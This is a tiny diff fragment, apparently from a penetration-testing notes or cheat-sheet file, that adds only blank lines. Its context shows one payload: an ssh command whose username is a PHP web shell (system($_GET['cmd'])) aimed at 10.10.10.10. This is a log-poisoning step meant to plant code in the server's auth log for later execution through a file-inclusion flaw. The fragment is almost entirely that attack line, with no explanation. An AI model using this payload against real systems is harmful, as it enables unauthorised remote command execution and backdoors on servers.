@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:20.489991+00:00'
 ```powershell
 ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 ```
+
+
